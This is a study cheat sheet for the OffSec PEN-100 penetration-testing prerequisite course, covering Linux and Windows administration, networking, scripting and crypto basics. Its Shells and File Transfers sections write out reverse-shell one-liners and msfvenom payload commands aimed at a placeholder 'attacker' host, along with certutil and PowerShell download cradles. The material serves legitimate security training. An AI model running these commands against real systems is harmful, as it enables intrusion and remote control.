# PEN-100 — Prerequisite Foundations
> OffSec intro course | OSCP prerequisite | Prepares for PEN-200

---

## Purpose & Structure
- Security fundamentals for beginners + refresher for intermediate
- Three pillars: **Linux/Windows sysadmin**, **Networking**, **Scripting**
- Uses Try Harder mindset — attempt before using hints
- Exercises: knowledge recall + hands-on flags (`OS{hash}`)
- Lab access via VPN (`.ovpn` file) or in-browser Kali VM

---

## Security Concepts

### CIA Triad
| Property | Meaning | Attack Example |
|----------|---------|----------------|
| Confidentiality | only authorized access | eavesdropping, credential stuffing |
| Integrity | data/function unchanged | arbitrary code execution |
| Availability | authorized users can access | denial of service |

### Key Principles
- **Least Privilege** — grant minimum access needed
- **Open Security** — security shouldn't depend on secrecy of design
- **Defense in Depth** — multiple layered defenses

### Mindsets
- Growth mindset — skills are learnable, mistakes are learning
- Security mindset (Bruce Schneier) — always ask "how could this be attacked?"
- Try Harder — enumerate more, change approach, don't give up

---

## Linux Basics

### History
- Linux = kernel (not full OS), created by Linus Torvalds
- Monolithic kernel vs microkernel (Minix)
- GNU/Linux = GNU tools + Linux kernel = a distribution
- Kali Linux = Debian-based, OffSec-maintained, pentest-focused

### Command Line Basics
```bash
pwd              # print working directory
cd <dir>         # change directory
cd ..            # go up one level
cd ~             # go to home directory
ls               # list files
ls -la           # long format, show hidden files
cat file         # print file contents
cat -n file      # with line numbers
head -n 3 file   # first 3 lines
tail -n 3 file   # last 3 lines
more / less      # paginated view
```

### Paths
- Absolute: `/etc/passwd` (from root, works anywhere)
- Relative: `../../etc/passwd` (from current location)
- `~` = home directory shortcut

### Shells
- `sh` — Bourne Shell, foundation
- `bash` — Bourne-Again Shell, default on most distros
- `zsh` — extended Bourne with improvements
- `ksh` — Korn Shell

### Man Pages & Help
```bash
man ls              # manual for ls
man -k passwd       # keyword search
man 5 passwd        # section 5 of passwd
command --help      # inline help
command -h          # short help
```

Man page sections: 1=commands, 2=syscalls, 3=lib functions, 4=devices, 5=file formats, 8=admin

### Filesystem
- Root = `/`, all files descend from here (no drive letters)
- Key dirs: `/etc` (configs), `/home` (users), `/var` (logs/data), `/tmp` (temp), `/bin` `/usr/bin` (binaries)

### Environment
```bash
set                  # show all shell variables
env                  # show environment variables
export VAR=value     # set env variable
alias ll='ls -la'    # create alias
uname -a             # kernel info
cat /etc/issue       # distro version
echo $SHELL          # current shell
echo $PATH           # executable search path
```

### File Management
```bash
touch file           # create empty file
rm file              # delete file
rm -rf dir           # delete directory recursively
mkdir dir            # create directory
rmdir dir            # delete empty directory
mv file dest         # move/rename
cp file dest         # copy
ln -s target link    # soft (symbolic) link
ln target link       # hard link
which cmd            # find binary path
locate file          # find file (uses db)
find / -name file    # live search
find / -perm -4000   # find SUID files
```

Wildcards: `*` = any chars, `?` = single char

### Piping & Redirection
```bash
cmd > file           # redirect stdout to file (overwrite)
cmd >> file          # append stdout to file
cmd < file           # stdin from file
cmd 2> file          # redirect stderr
cmd 2>&1             # stderr to stdout
cmd1 | cmd2          # pipe stdout to next stdin
```

### Search & Text Manipulation
```bash
grep "pattern" file  # search in file
grep -r "pattern" .  # recursive search
sed 's/old/new/' file # replace text in stream
cut -d: -f1 file     # extract field (delimiter + field)
sort file            # sort lines
sort -r file         # reverse sort
comm file1 file2     # compare sorted files
diff file1 file2     # show differences
wc -l file           # count lines
```

---

## Linux Basics II

### Users & Groups
```bash
/etc/passwd          # user accounts
/etc/shadow          # password hashes (root only)
/etc/group           # group memberships
id                   # current user/group info
whoami               # current username
su - user            # switch user
sudo cmd             # run as root
sudo -l              # list sudo permissions
sudo -i              # root shell
```

### File Permissions
```
-rwxr-xr-- 1 user group size date file
 |||||||
 ||||||└── other: r--
 |||└───── group: r-x
 └──────── owner: rwx

r=4, w=2, x=1
chmod 755 file       # rwxr-xr-x
chmod u+x file       # add execute for owner
chown user:group file # change ownership
```

Special bits: SUID (4), SGID (2), sticky (1)
- SUID on binary runs as file owner (e.g., `passwd`)

### Processes
```bash
ps aux               # all running processes
ps aux | grep name   # filter
kill -9 PID          # force kill
kill -15 PID         # graceful terminate (SIGTERM)
jobs                 # list background jobs
bg                   # background current job
fg                   # foreground job
cmd &                # run in background
```

### File & Command Monitoring
```bash
tail -f /var/log/syslog   # follow log file live
watch -n 1 'w'            # repeat command every 1s
```

### Package Management (Debian/Kali)
```bash
apt update              # refresh package lists
apt install pkg         # install package
apt remove pkg          # remove package
apt-cache search term   # search packages
apt show pkg            # package details
dpkg -i pkg.deb         # install .deb manually
```

### Scheduled Tasks (cron)
```bash
crontab -l              # list cron jobs
cat /etc/crontab        # system cron
ls /etc/cron.*          # cron directories
# format: min hr day month weekday command
```

### Disk Management
```bash
df -h                   # disk space usage
free -m                 # memory usage
mount                   # show mounted filesystems
fdisk -l                # list disk partitions
mount /dev/sdb1 /mnt    # mount device
umount /mnt             # unmount
```

---

## Windows Basics

### CMD Essentials
```cmd
help                 :: list commands
help time            :: help for specific command
time /?              :: alternative help
cd \                 :: go to C:\
cd ..                :: go up
dir                  :: list directory
dir /A               :: show hidden files
dir /s *.exe         :: search recursively
type file.txt        :: print file contents
tree                 :: directory structure
```

### System Info
```cmd
systeminfo           :: full system info
hostname             :: computer name
whoami               :: current user
set                  :: all env variables
echo %USERNAME%      :: specific variable
setx VAR value       :: set persistent variable
```

Key env variables: `%PATH%`, `%USERNAME%`, `%TEMP%`, `%USERPROFILE%`, `%COMPUTERNAME%`

### File Management (CMD)
```cmd
echo text > file.txt     :: create/overwrite file
echo text >> file.txt    :: append
del file.txt             :: delete file
ren old.txt new.txt      :: rename
move file.txt dir\       :: move file
mkdir dir                :: create directory
rmdir /S dir             :: delete directory with contents
copy src.txt dst.txt     :: copy file
fc file1 file2           :: compare files
mklink link target       :: soft symlink
mklink /H link target    :: hard link
```

### Search
```cmd
dir /s filename          :: find file
findstr "text" file.txt  :: search in file
where cmd                :: find executable
forfiles /P dir /M *.exe :: find by extension
sort /R file.txt         :: reverse sort
```

### Windows Access Control
- SID = Security Identifier (unique per user/group)
- `whoami /user` — show own SID
- ACL = Access Control List on each object
- DACL = Discretionary ACL (who has what access)

### Users & Groups (CMD)
```cmd
net user                         :: list users
net user name pass /add          :: add user
net user name /del               :: delete user
net localgroup                   :: list groups
net localgroup Administrators name /add  :: add to group
net accounts                     :: password policy
runas /user:admin cmd            :: run as different user
```

### Permissions (icacls)
```cmd
icacls file              :: view permissions
icacls file /grant user:F :: grant full control
icacls file /deny user:W  :: deny write
```
Permission flags: F=full, M=modify, RX=read+execute, R=read, W=write, D=delete

Sysinternals: `accesschk.exe` for detailed permission auditing

### Processes
```cmd
tasklist                 :: running processes
tasklist /svc            :: processes + services
taskkill /PID 1234       :: kill by PID
taskkill /IM chrome.exe  :: kill by name
pslist                   :: Sysinternals process list
pskill PID               :: Sysinternals kill
listdlls                 :: list loaded DLLs (find unsigned)
```

### Windows Libraries (DLLs)
- DLLs = shared code loaded into process memory
- Common: `kernel32.dll`, `ntdll.dll`, `user32.dll`, `advapi32.dll`
- Unsigned DLLs = potential malicious indicator

### Windows Registry
```
HKLM  = HKEY_LOCAL_MACHINE  (system-wide)
HKCU  = HKEY_CURRENT_USER   (current user)
HKCR  = HKEY_CLASSES_ROOT
HKU   = HKEY_USERS
HKCC  = HKEY_CURRENT_CONFIG

Persistence keys:
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
```

```cmd
reg query HKCU\...\Run         :: list startup entries
reg add HKCU\...\Run /v name /d path  :: add entry
reg delete HKCU\...\Run /v name       :: remove entry
reg export HKCU\key file.reg          :: export
```

### Scheduled Tasks
```cmd
schtasks                                  :: list tasks
schtasks /create /tn name /tr cmd /sc DAILY /st 09:00  :: create
schtasks /delete /tn name /f              :: delete
schtasks /query /TN name /fo LIST        :: query
```

### Disk Utilities
```cmd
fsutil fsinfo drives            :: list drives
fsutil fsinfo drivetype C:      :: drive type
fsutil fsinfo volumeinfo C:     :: volume details
dir /r                          :: show Alternate Data Streams
more < file.txt:stream          :: read ADS content
```
Sysinternals `du` for disk usage analysis

---

## Networking Fundamentals

### OSI Model (7 layers)
| Layer | Name | Examples |
|-------|------|---------|
| 7 | Application | HTTP, FTP, DNS |
| 6 | Presentation | SSL/TLS, encoding |
| 5 | Session | NetBIOS, RPC |
| 4 | Transport | TCP, UDP |
| 3 | Network | IP, ICMP |
| 2 | Data Link | Ethernet, ARP |
| 1 | Physical | Cables, radio |

### TCP/IP Model (4 layers)
Application → Transport → Internet → Link

### Key Protocols
- IP — addressing and routing (Layer 3)
- TCP — reliable, connection-oriented (Layer 4)
- UDP — fast, connectionless (Layer 4)
- ARP — IP → MAC resolution (Layer 2)
- DHCP — dynamic IP assignment
- DNS — hostname → IP resolution
- HTTP/HTTPS — web (port 80/443)
- SSH — secure shell (port 22)
- FTP — file transfer (port 20/21)
- SMTP — email (port 25)
- SMB — file sharing (port 445)

### IP Addressing
- IPv4: 32-bit, dotted decimal (e.g., `192.168.1.1`)
- Subnet mask: determines network vs host bits (`255.255.255.0` = `/24`)
- CIDR: `192.168.1.0/24` = 256 addresses
- Binary AND of IP + mask = network address

### Packet Analysis Tools
- **Wireshark** — GUI packet capture, 3 panes (packet list, details, bytes)
- **tcpdump** — CLI capture, requires root, save to `.pcap`

### TCP/IP Helper Protocols
- ARP: `arp -en` (Linux), `arp -a` (Windows) — view/add ARP table
- DHCP: client broadcasts → server offers → client requests → ACK
- ICMP: `ping` uses ICMP echo request/reply

---

## Linux Networking

### Interface Management
```bash
ip addr                  # show interfaces + IPs
ip link                  # show link status
ifconfig                 # legacy (net-tools)
hostname                 # show hostname
```

### Connections & Ports
```bash
netstat -natup           # all TCP/UDP connections + PIDs
ss -natup                # modern replacement for netstat
arp -en                  # ARP table with hostnames
```

### Routing
```bash
route                    # routing table
ip route                 # modern routing table
route add -net x.x.x.x netmask x.x.x.x gw x.x.x.x  # add route
ping -c 5 host           # send 5 ICMP pings
traceroute host          # trace network path
```

### DNS Resolution
```bash
/etc/resolv.conf         # DNS server config
/etc/hosts               # local hostname overrides
/etc/nsswitch.conf       # resolution order (files → dns)
host domain              # DNS lookup
dig domain               # detailed DNS query
nslookup domain          # interactive DNS query
```

### SSH / SCP / sshpass
```bash
ssh user@host                    # connect
ssh -p 2222 user@host            # custom port
ssh-keygen -t ed25519            # generate key pair
ssh-copy-id user@host            # copy pub key to remote
scp file user@host:/path         # copy file to remote
scp user@host:/path file         # copy file from remote
sshpass -p 'pass' ssh user@host  # non-interactive (insecure)
```
Config: `~/.ssh/config` — define Host aliases

### Netcat
```bash
nc -nlvp 4444            # listener (no-dns, listen, verbose, port)
nc host 4444             # connect to host
nc -nlvp 4444 > file     # receive file
nc host 4444 < file      # send file
nc -nlvp 4444 -e /bin/bash  # bind shell (Linux)
nc host 4444 -e cmd.exe  # bind shell (Windows)
bash -i >& /dev/tcp/host/4444 0>&1  # reverse shell
```

### HTTP Tools
```bash
wget URL                          # download file
wget -O name URL                  # save as name
wget -o log.txt URL               # save log
wget -r URL                       # recursive download
curl URL                          # fetch URL to stdout
curl -o file URL                  # save to file
curl -I URL                       # headers only
curl -x proxy:port URL            # use proxy
curl -k URL                       # ignore SSL errors
```

### DNS Tools
```bash
host domain              # simple lookup
host -t MX domain        # MX records
dig domain               # full DNS query
dig MX domain            # MX records
nslookup domain          # interactive
```

### FTP
```bash
ftp -v -n host           # verbose, no auto-login
# ftp commands:
# ls, cd, get file, put file, binary, ascii, bye
```

---

## Linux Networking II

### Firewalls — iptables
```bash
iptables -L -n --line-numbers    # list rules with numbers
iptables -A INPUT -s host -j DROP  # add rule
iptables -D INPUT 3              # delete rule by number
iptables -I INPUT 1 -j DROP      # insert at position
iptables -P INPUT DROP           # set default policy
iptables-save > rules            # save rules
iptables-restore < rules         # restore rules
```

Connection states: `NEW`, `ESTABLISHED`, `RELATED`, `INVALID`

### UFW (Uncomplicated Firewall)
```bash
ufw enable / disable
ufw allow ssh
ufw allow 80/tcp
ufw deny from 10.0.0.1
ufw status
```

### Services (systemd)
```bash
systemctl start ssh
systemctl stop ssh
systemctl restart ssh
systemctl status ssh
systemctl enable ssh     # start on boot
systemctl disable ssh
systemctl list-units
```

Legacy: `service ssh start`, `/etc/init.d/ssh start`

---

## Windows Networking

### Network Tools
```cmd
ipconfig /all            :: all interface details
ipconfig /release        :: release DHCP lease
ipconfig /renew          :: renew DHCP lease
ipconfig /displaydns     :: DNS cache
ipconfig /flushdns       :: clear DNS cache
netstat -ano             :: connections + PIDs
arp -a                   :: ARP table
route print              :: routing table
ping host                :: ICMP ping
tracert host             :: trace route
pathping host            :: combined tracert + stats
nbtstat /n               :: NetBIOS names
nslookup host            :: DNS lookup
```

### Windows Firewall
```cmd
netsh advfirewall reset
netsh advfirewall show allprofiles
netsh advfirewall firewall add rule name="Block" dir=out action=block remoteip=x.x.x.x protocol=icmpv4
netsh advfirewall firewall delete rule name="Block"
```

### Windows Services
```cmd
sc query svcname         :: service status
sc qc svcname            :: service config
sc start svcname
sc stop svcname
sc config svcname start=auto  :: set startup type
net start svcname
net stop svcname
```
Sysinternals: `PsService.exe query`, `PsService.exe config`

### File Sharing
```cmd
net share                :: list shares
net use Z: \\host\share  :: map drive
net use \\host\share     :: connect without drive letter
```

---

## Bash Scripting

### Basics
```bash
#!/bin/bash              # shebang — always first line
# comment
echo "Hello World"
chmod +x script.sh       # make executable
./script.sh              # run
bash script.sh           # alternative run
```

### Variables
```bash
name="Alice"             # assign (no spaces around =)
echo $name               # use variable
echo "${name}_suffix"    # in string
result=$(command)        # command substitution
let num=5+3              # arithmetic
echo $((5 + 3))          # arithmetic expansion
```

### Arguments
```bash
$0   # script name
$1   # first argument
$2   # second argument
$@   # all arguments
$#   # argument count
$?   # last exit code (0=success)
```

### Input/Output
```bash
read var                 # read user input
read -s pass             # silent input (passwords)
read -p "Enter: " var    # prompt + read
echo $var > file         # redirect to file
echo $var >> file        # append to file
```

### Conditionals
```bash
if [ $num -gt 5 ]; then
    echo "big"
elif [ $num -eq 5 ]; then
    echo "equal"
else
    echo "small"
fi

# String operators: =, !=
# Integer operators: -eq, -ne, -gt, -lt, -ge, -le
# File tests: -f (file), -d (dir), -e (exists), -x (executable)
```

### Boolean Operators
```bash
cmd1 && cmd2    # run cmd2 only if cmd1 succeeds
cmd1 || cmd2    # run cmd2 only if cmd1 fails
```

### Loops
```bash
for i in 1 2 3; do echo $i; done
for i in {1..10}; do echo $i; done
for f in *.txt; do cat $f; done

while [ $i -lt 10 ]; do
    echo $i
    ((i++))
done
```

### Functions
```bash
greet() {
    echo "Hello $1"
    return 0
}
greet "Alice"
result=$?     # capture return value
```

Local variables: `local var=value` inside function

---

## Python Scripting

### Basics
```python
#!/usr/bin/env python3
print("Hello World")
# run: python3 script.py or chmod +x + ./script.py
```

### Variables & Types
```python
name = "Alice"           # str
age = 25                 # int
pi = 3.14                # float
flag = True              # bool
# type casting
str(25)   int("25")   float("3.14")
# slicing
s = "Hello"
s[0:3]   # "Hel"
s[-1]    # "o"
```

### Lists & Dicts
```python
lst = ["a", "b", "c"]
lst.append("d")
lst.remove("a")
len(lst)
lst[0]               # index

d = {"key": "value"}
d["new"] = "data"    # add/update
d["key"]             # access
list(d.keys())       # all keys
```

### Control Flow
```python
if x > 5:
    pass
elif x == 5:
    pass
else:
    pass

for item in list:
    print(item)

while condition:
    pass

for i in range(0, 10, 2):  # start, stop, step
    pass
```

### File I/O
```python
with open("file.txt", "r") as f:
    content = f.read()
    lines = f.readlines()

with open("file.txt", "w") as f:
    f.write("data\n")

with open("file.txt", "a") as f:
    f.write("append\n")
```

### Functions
```python
def greet(name, greeting="Hello"):
    return f"{greeting}, {name}"

result = greet("Alice")
```

### Modules & HTTP
```python
import requests
r = requests.get("http://example.com")
print(r.status_code)   # 200
print(r.text)          # response body
print(r.headers)       # response headers
r2 = requests.post("http://example.com", data={"key": "val"})
```

### Sockets
```python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("host", 80))
s.send(b"GET / HTTP/1.0\r\n\r\n")
data = s.recv(1024)
print(data.decode())
s.close()
```

### Web Spider Pattern
```python
import requests
url = "http://target/"
urlList = [url]
visited = {}
for link in urlList:
    if link not in visited:
        r = requests.get(link)
        visited[link] = True
        # parse links from r.text, add to urlList
```

---

## PowerShell Scripting

### Basics
```powershell
$PSVersionTable                  # check PS version
Get-Help cmdlet                  # help system
Get-Help cmdlet -Examples        # show examples
Get-Alias                        # list aliases
Get-Command -Name *process*      # find commands
Get-Verb                         # list approved verbs
```

### Variables
```powershell
$name = "Alice"
$num = 42
$arr = @(1, 2, 3)
$arr[0]                          # index array
Clear-Variable name              # clear variable
$name | Get-Member               # show methods/properties
$name.ToLower()                  # call method
$name.Length                     # property
```

### Comparison & Logic
```powershell
-eq  -ne  -gt  -lt  -ge  -le    # equality
-like  -match  -notmatch         # string matching
-contains  -in                   # containment
-and  -or  -not                  # logical
```

### Control Flow
```powershell
if ($x -gt 5) { "big" } elseif ($x -eq 5) { "equal" } else { "small" }

switch ($var) {
    "a" { "is a" }
    "b" { "is b" }
}

for ($i=0; $i -lt 5; $i++) { Write-Output $i }
foreach ($item in $array) { Write-Output $item }
while ($count -lt 5) { $count++ }
do { $count++ } while ($count -lt 5)
```

### Functions
```powershell
function Get-Greeting {
    param($Name)
    return "Hello $Name"
}
Get-Greeting -Name "Alice"
```

### Pipeline & Objects
```powershell
Get-Service | Where-Object {$_.Status -eq "Running"}
Get-Service | Select-Object Name, Status
Get-Service | Sort-Object Name
Get-Service | Format-Table -AutoSize
Get-Service | Format-List
Get-Process | Get-Member            # inspect object properties
```

### Registry via PS
```powershell
cd HKLM:                           # navigate to registry
Get-ChildItem HKLM:\SOFTWARE
New-Item HKLM:\SOFTWARE\myKey
New-ItemProperty -Path HKLM:\SOFTWARE\myKey -Name "Val" -Value "data"
```

### Execution Policy & Scripts
```powershell
Get-ExecutionPolicy                # check current policy
Set-ExecutionPolicy RemoteSigned   # allow local scripts
powershell -ExecutionPolicy Bypass -File script.ps1  # bypass for session
```

### Modules
```powershell
Get-Module                         # loaded modules
Get-Command -Module defender       # commands in module
Import-Module ModuleName
```

---

## Network Scripting (Python)

### Port Scanner
```python
import socket, time
target = "192.168.1.1"
start = time.time()
for port in range(1, 1025):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(0.5)
    if s.connect_ex((target, port)) == 0:
        print(f"Port {port}: OPEN")
    s.close()
print(f"Duration: {time.time()-start:.2f}s")
```

### HTTP Status Codes
- 1xx — Informational
- 2xx — Success (200 OK)
- 3xx — Redirect
- 4xx — Client error (404 Not Found, 403 Forbidden)
- 5xx — Server error (500 Internal Server Error)

### Scapy (Packet Crafting)
```python
from scapy.all import *
packets = sniff(count=10)         # capture packets
packets.summary()
pkt = IP(dst="host")/TCP(dport=80)  # craft packet
send(pkt)                         # send (L3)
ans, _ = sr(pkt)                  # send + receive
```

---

## Shells

### Shell Types
- **Bind shell** — target opens listener, attacker connects in
- **Reverse shell** — target connects back to attacker's listener
- Reverse preferred — bypasses inbound firewall rules

### Netcat Shells
```bash
# Bind shell (on target)
nc -nlvp 4444 -e /bin/bash        # Linux
nc -nlvp 4444 -e cmd.exe          # Windows

# Attacker connects
nc target 4444

# Reverse shell listener (on attacker)
nc -nlvp 443

# Reverse shell (on target)
bash -i >& /dev/tcp/attacker/443 0>&1
nc attacker 443 -e /bin/bash
```

### socat
```bash
# listener
socat TCP-LISTEN:4444,fork EXEC:/bin/bash

# connect
socat TCP:host:4444 -

# reverse shell
socat TCP:attacker:443 EXEC:/bin/bash

# encrypted bind shell (SSL)
socat OPENSSL-LISTEN:443,cert=cert.pem,verify=0,fork EXEC:/bin/bash
socat OPENSSL:host:443,verify=0 -
```

### PowerShell Remote Shells
```powershell
# Enable PS Remoting
Enable-PSRemoting -Force
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "*"

# Remote command
Invoke-Command -ComputerName host -ScriptBlock { ipconfig }

# Interactive session
Enter-PSSession -ComputerName host -Credential user
```

### msfvenom Payloads
```bash
# List payloads
msfvenom -l payloads | grep linux/x86/shell_reverse

# Linux ELF reverse shell
msfvenom -p linux/x86/shell_reverse_tcp LHOST=x.x.x.x LPORT=443 -f elf -o shell.elf

# Windows EXE reverse shell
msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x LPORT=443 -f exe -o shell.exe

# Deliver via python http.server, wget on target, chmod +x, run
```

---

## Cryptography

### Encoding
- **Binary** — base-2 (bits)
- **Hexadecimal** — base-16 (0-9, A-F)
- **Base64** — binary → printable ASCII (for transmission)
- **ASCII/UTF-8** — text character encoding

```bash
echo "text" | base64          # encode
echo "dGV4dAo=" | base64 -d   # decode
xxd file                      # hex dump
iconv -f ASCII -t UTF-8 file  # convert encoding
# Windows
certutil -encode file out.b64
certutil -decode out.b64 file
```

### Hashing
- One-way function — cannot reverse
- Same input → always same output
- Used for: password storage, file integrity, checksums
- Common: MD5 (broken), SHA1 (weak), SHA256, SHA512

```bash
md5sum file
sha256sum file
sha1sum file
echo "text" | sha256sum
# Windows
certutil -hashfile file sha256
```

### Password Security
- Hash + salt = prevents rainbow table attacks
- Cracking: `john --wordlist=rockyou.txt hash.txt`
- LM hashes (legacy Windows) — weak, crackable fast
- NTLM hashes — stronger but crackable with GPU

### Symmetric Encryption
- Same key encrypts and decrypts
- ROT13: `echo "text" | tr 'A-Za-z' 'N-ZA-Mn-za-m'`
- XOR cipher: key XOR plaintext = ciphertext
- Blowfish, AES-256 — strong modern ciphers

```bash
openssl enc -aes-256-cbc -e -in file -out enc.file   # encrypt
openssl enc -aes-256-cbc -d -in enc.file -out file   # decrypt
```

### Asymmetric Encryption
- Key pair: public (encrypt) + private (decrypt)
- RSA, ECC — public key crypto
- Used in: TLS/HTTPS, SSH keys, GPG

```bash
gpg --gen-key                        # generate key pair
gpg --export -a "Name" > pub.key     # export public key
gpg -e -r "Name" file               # encrypt with public key
gpg -d file.gpg                      # decrypt with private key

ssh-keygen -t ed25519                # SSH key pair
ssh-copy-id user@host                # deploy public key
ssh -i ~/.ssh/id_ed25519 user@host   # login with key

# SSL certificate
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
```

---

## Web Applications

### OWASP Top 10 (key categories)
1. Broken Access Control
2. Cryptographic Failures
3. Injection (SQLi, XSS, etc.)
4. Insecure Design
5. Security Misconfiguration
6. Vulnerable & Outdated Components
7. Identification & Auth Failures
8. Software & Data Integrity Failures
9. Security Logging & Monitoring Failures
10. SSRF

### HTTP Protocol
```
Request:
GET /path?param=val HTTP/1.1
Host: example.com
Accept: text/html

Response:
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 500

<html>...
```

HTTP Methods: `GET`, `POST`, `PUT`, `DELETE`, `PATCH`, `OPTIONS`, `HEAD`

Key request headers: `Host`, `User-Agent`, `Cookie`, `Authorization`, `Content-Type`, `Referer`, `Origin`

Key response headers: `Set-Cookie`, `Location`, `Server`, `Content-Type`, `X-Frame-Options`

### SQL Basics
```sql
SELECT col FROM table WHERE condition
SELECT * FROM users WHERE name='Alice'
SELECT a, b FROM t1 JOIN t2 ON t1.id=t2.uid
SELECT id FROM users UNION SELECT id FROM admins
```

### Tools
- **Burp Suite** — intercept, repeat, fuzz HTTP requests
- `robots.txt` — pages excluded from crawlers (often reveals hidden paths)
- URL encoding: `%20`=space, `%2F`=`/`, `%27`=`'`

---

## Active Directory Basics

### Overview
- Centralized auth for Windows networks
- Domain Controller (DC) = server managing AD
- Objects: Users, Groups, Computers, GPOs, OUs

### SID Format
`S-1-5-21-[domain]-[RID]`
- 500 = Administrator
- 1000+ = regular users

### Key Concepts
- Domain = logical group of objects
- Forest = collection of domains
- Trust = allows auth across domains
- GPO = Group Policy Object (applies settings to OUs/users)
- OU = Organizational Unit (container for objects)

### Enumeration (PowerShell)
```powershell
Get-ADUser -Identity jim            # get user
Get-ADGroupMember "Domain Admins"   # group members
Get-ADUser -Filter * | Select Name  # all users
```

---

## File Transfers

### Linux → Linux/Target
```bash
# Attacker serves file
python3 -m http.server 80
# Target downloads
wget http://attacker/file
curl http://attacker/file -o file

# SCP
scp file user@host:/path
scp user@host:/path file

# FTP
# Setup: pure-ftpd on kali
ftp -v -n host
# > user name pass
# > binary
# > get file / put file
```

### Target → Attacker (upload)
```bash
# Netcat
nc -nlvp 4444 > received.file    # attacker listens
nc attacker 4444 < send.file     # target sends

# curl POST to PHP upload page
# create upload.php on Apache, target submits form
```

### Windows File Transfers
```cmd
certutil -urlcache -split -f http://attacker/file output
bitsadmin /create job && bitsadmin /addfile job http://attacker/file C:\out && bitsadmin /resume job && bitsadmin /complete job
powershell -c "(New-Object Net.WebClient).DownloadFile('http://attacker/file','C:\out')"
powershell Invoke-WebRequest -Uri http://attacker/file -OutFile C:\out
```

---

## Troubleshooting Methodology

1. **Read the output** — what does the error say exactly?
2. **Do the research** — Google the error, check first 3-10 results
3. Check first and last lines of long output
4. Verify permissions (`ls -la`, `whoami`, `id`)
5. Verify the binary/dependency exists (`which`, `locate`)
6. Recompile with correct flags (missing headers → `apt install libssl-dev`)
7. Network issues — check interface, DHCP, DNS, routing in that order
8. Deleted files — `lsof` (open handles), `foremost` (disk recovery)

### Common Exploit Fix Steps
1. Download exploit from searchsploit/ExploitDB
2. Read the code — understand what it does
3. Compile: `gcc exploit.c -o exploit` (fix missing libs)
4. Adjust offsets, IPs, ports for target
5. Test in isolated environment first

---

## Key Commands Quick Reference

```bash
# Recon
nmap -sV -p- target
whois domain
dig domain ANY

# Shell upgrade
python3 -c 'import pty; pty.spawn("/bin/bash")'
stty raw -echo; fg

# VPN
sudo openvpn lab.ovpn   # connect
Ctrl+C                   # disconnect

# Flags
cat local.txt            # user flag
cat proof.txt            # root/SYSTEM flag
whoami && hostname && cat proof.txt   # proof screenshot
```
